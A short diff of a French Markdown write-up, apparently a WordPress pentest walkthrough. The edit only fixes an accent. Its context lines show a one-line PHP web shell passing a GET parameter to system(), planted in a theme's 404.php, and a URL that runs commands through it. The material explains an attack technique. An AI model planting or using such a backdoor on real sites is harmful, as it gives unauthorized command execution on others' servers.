@@ -74,7 +74,7 @@ if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
 die(); 
 ```
 
-Evidemment on évitera de mettre un `die()` dans un scénario plus réaliste.
+Évidemment on évitera de mettre un `die()` dans un scénario plus réaliste.
 
 Je peux alors exécuter des commandes via par exemple `/wp-content/themes/twentyfifteen/404.php?cmd=id`
 
